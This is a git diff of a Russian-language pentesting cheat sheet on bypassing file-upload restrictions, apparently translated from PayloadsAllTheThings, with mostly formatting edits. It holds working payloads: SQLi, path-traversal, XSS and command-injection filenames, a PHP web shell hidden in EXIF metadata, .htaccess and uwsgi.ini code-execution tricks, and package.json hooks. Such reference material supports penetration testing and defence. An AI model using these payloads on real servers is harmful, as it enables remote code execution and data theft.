@@ -63,7 +63,7 @@ veerrryyy_loonnggg_naaamme.php.png
 
 # Методология
 
-## Стандартные расширения
+## **Стандартные расширения**
 
 Вот список стандартных расширений для веб-шеллов на выбранных языках (PHP, ASP, JSP).
 
@@ -117,7 +117,7 @@ shell.soap
 * ```.zip```: RCE, DOS, LFI Gadget
 * ```.html``` : XSS, Открытое перенаправление
 
-## Уловки загрузки
+## **Уловки загрузки**
 
 **Расширения**:
 
@@ -194,10 +194,12 @@ application/x-httpd-php-source
 
 **Инкапсуляция файлов**:
 
-Использование альтернативного потока данных (ADS) NTFS в Windows. В этом случае символ двоеточия ":" будет вставлен после запрещенного расширения и перед разрешенным. В результате на сервере будет создан пустой файл с запрещенным расширением (например, "file.asax:.jpg"). Этот файл можно позже отредактировать, используя другие методы, такие как использование его короткого имени. Шаблон "::$data" также можно использовать для создания непустых файлов. Поэтому добавление точки после этого шаблона также может быть полезно для обхода дальнейших ограничений (например, "file.asp::$data.").
-
 * ADS (Alternate Data Stream) — скрытые "отсеки" внутри файлов. ("документ внутри документа")
     * Двоеточие : — это как команда Windows: "Создай скрытый отсек внутри файла"
+  
+> Использование альтернативного потока данных (ADS) NTFS в Windows. В этом случае символ двоеточия ":" будет вставлен после запрещенного расширения и перед разрешенным.
+>> В результате на сервере будет создан пустой файл с запрещенным расширением (например, "file.asax:.jpg"). Этот файл можно позже отредактировать, используя другие методы, такие как использование его короткого имени.
+>>> Шаблон "::$data" также можно использовать для создания непустых файлов. Поэтому добавление точки после этого шаблона также может быть полезно для обхода дальнейших ограничений (например, "file.asp::$data.").
     
 **Другие методы**:
 
@@ -278,73 +280,76 @@ _____________________________________________
    * Бэктики (``) - выполняют shell-команды
    * Доступ к функциям - зависит от настроек disable_functions
 _______________________________________
-## Уязвимости имени файла
 
-Иногда уязвимость заключается не в загрузке, а в том, как файл обрабатывается после. Вы можете попробовать загрузить файлы с полезными нагрузками в имени файла.
+## **Уязвимости имени файла**
 
-    Полезные нагрузки Time-Based SQLi: например, poc.js'(select*from(select(sleep(20)))a)+'.extension
-    Полезные нагрузки LFI/Path Traversal: например, image.png../../../../../../../etc/passwd
-    Полезные нагрузки XSS: например, '"><img src=x onerror=alert(document.domain)>.extension
-    Обход файловой системы: например, ../../../tmp/lol.png
-    Инъекция команд: например, ; sleep 10;
+Иногда уязвимость заключается не в загрузке, а в том, как файл обрабатывается после. Можно попробовать загрузить файлы с полезными нагрузками в имени файла.
 
-Также вы можете загрузить:
+* Полезные нагрузки Time-Based SQLi: например, ```poc.js'(select*from(select(sleep(20)))a)+'.extension```
+* Полезные нагрузки LFI/Path Traversal: например, ```image.png../../../../../../../etc/passwd```
+* Полезные нагрузки XSS: например, ```'"><img src=x onerror=alert(document.domain)>.extension```
+* Обход файловой системы: например, ```../../../tmp/lol.png```
+* Инъекция команд: например, ```; sleep 10;```
 
-    HTML/SVG файлы для запуска XSS
-    Файл EICAR для проверки наличия антивируса
+Также можно загрузить:
+
+* HTML/SVG файлы для запуска XSS
+* Файл EICAR для проверки наличия антивируса
+   * ```X5O!P%@AP_EICAR_TEST.jpg``` 
 
 ### Сжатие изображений
 
-Создавайте валидные изображения, содержащие PHP-код. Загрузите изображение и используйте Local File Inclusion для выполнения кода. Шелл можно вызвать следующей командой: curl 'http://localhost/test.php?0=system' --data "1='ls'".
+Создай валидные изображения, содержащие PHP-код. Загрузи изображение и используй Local File Inclusion для выполнения кода. Шелл можно вызвать следующей командой: ```curl 'http://localhost/test.php?0=system' --data "1='ls'"```.
 
-    Метаданные изображения - скрыть полезную нагрузку внутри тега комментария в метаданных.
-    Изменение размера изображения - скрыть полезную нагрузку в алгоритме сжатия, чтобы обойти изменение размера. Также обходит getimagesize() и imagecreatefromgif().
-        JPG: используйте createBulletproofJPG.py
-        PNG: используйте createPNGwithPLTE.php
-        GIF: используйте createGIFwithGlobalColorTable.php
+* Метаданные изображения - скрыть полезную нагрузку внутри тега комментария в метаданных.
+* Изменение размера изображения - скрыть полезную нагрузку в алгоритме сжатия, чтобы обойти изменение размера. Также обходит getimagesize() и imagecreatefromgif().
+   * [JPG](https://virtualabs.fr/Nasty-bulletproof-Jpegs-l): используйте createBulletproofJPG.py
+   * [PNG](https://blog.isec.pl/injection-points-in-popular-image-formats/): используйте createPNGwithPLTE.php
+   * [GIF](https://blog.isec.pl/injection-points-in-popular-image-formats/): используйте createGIFwithGlobalColorTable.php
 
 ### Метаданные изображений
 
-Создайте пользовательское изображение и вставьте тег exif с помощью exiftool. Список нескольких тегов exif можно найти на exiv2.org
-
+* Создайте пользовательское изображение и вставьте тег exif с помощью exiftool. Список нескольких тегов exif можно найти на [exiv2.org](https://exiv2.org/tags.html)
+```bash
 convert -size 110x110 xc:white payload.jpg
 exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
 exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
+```
 
 ### Файлы конфигурации
 
-Если вы пытаетесь загрузить файлы на:
+Если пытаешься загрузить файлы на:
 
-    PHP сервер, посмотрите на трюк с .htaccess для выполнения кода.
-    ASP сервер, посмотрите на трюк с web.config для выполнения кода.
-    uWSGI сервер, посмотрите на трюк с uwsgi.ini для выполнения кода.
+* PHP сервер, посмотри на трюк с [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess) для выполнения кода.
+* ASP сервер, посмотри на трюк с [web.config для](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config) выполнения кода.
+* uWSGI сервер, посмотри на трюк с [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini) для выполнения кода.
 
-Примеры файлов конфигурации
+* Примеры файлов конфигурации
+   * Apache: [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess)
+   * IIS: [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)
+   * Python: [__init__.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20Python%20__init__.py/python-generate-init.py)
+   * WSGI: [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini)
 
-    Apache: .htaccess
-    IIS: web.config
-    Python: __init__.py
-    WSGI: uwsgi.ini
-
-Apache: .htaccess
+**Apache: .htaccess**
 
 Директива AddType в файле .htaccess используется для указания MIME-типа для разных расширений файлов на сервере Apache HTTP. Эта директива помогает серверу понять, как обрабатывать разные типы файлов и какой тип контента с ними связывать при передаче клиентам (таким как веб-браузеры).
 
 Вот базовый синтаксис директивы AddType:
-
+```
 AddType mime-type extension [extension ...]
-
+```
 Эксплуатируйте директиву AddType, загрузив файл .htaccess со следующим содержимым.
-
+```
 AddType application/x-httpd-php .rce
+```
+Затем загрузите любой файл с расширением ```.rce.```
 
-Затем загрузите любой файл с расширением .rce.
-WSGI: uwsgi.ini
+**WSGI: uwsgi.ini**
 
 Файлы конфигурации uWSGI могут включать «магические» переменные, заполнители и операторы, определенные с точным синтаксисом. Оператор ‘@’, в частности, используется в форме @(filename) для включения содержимого файла. Поддерживается множество схем uWSGI, включая “exec” - полезно для чтения из стандартного вывода процесса. Эти операторы можно использовать для удаленного выполнения команд или произвольной записи/чтения файлов, когда анализируется файл конфигурации .ini:
 
 Пример вредоносного файла uwsgi.ini:
-
+```
 [uwsgi]
 ; чтение из символа
 foo = @(sym://uwsgi_funny_function)
@@ -358,27 +363,31 @@ content = @(fd://[REDACTED])
 body = @(exec://whoami)
 ; вызов функции, возвращающей char *
 characters = @(call://uwsgi_func)
+```
 
 Когда файл конфигурации будет разобран (например, перезапуск, сбой или авто-перезагрузка), полезная нагрузка будет выполнена.
-Менеджер зависимостей
 
-В качестве альтернативы вы можете попробовать загрузить JSON-файл с пользовательскими скриптами, попытаться перезаписать файл конфигурации менеджера зависимостей.
+**Менеджер зависимостей**
 
-    package.json
+В качестве альтернативы можно попробовать загрузить JSON-файл с пользовательскими скриптами и попытаться перезаписать файл конфигурации менеджера зависимостей.
 
+* package.json
+```
     "scripts": {
         "prepare" : "/bin/touch /tmp/pwned.txt"
     }
+```
 
-composer.json
-
+* composer.json
+```
 "scripts": {
     "pre-command-run" : [
     "/bin/touch /tmp/pwned.txt"
     ]
 }
+```
 
-### CVE - ImageMagick
+## CVE - ImageMagick
 
 Если бэкенд использует ImageMagick для изменения размера/конвертации пользовательских изображений, вы можете попробовать эксплуатировать известные уязвимости, такие как ImageTragik.
 CVE-2016–3714 - ImageTragik
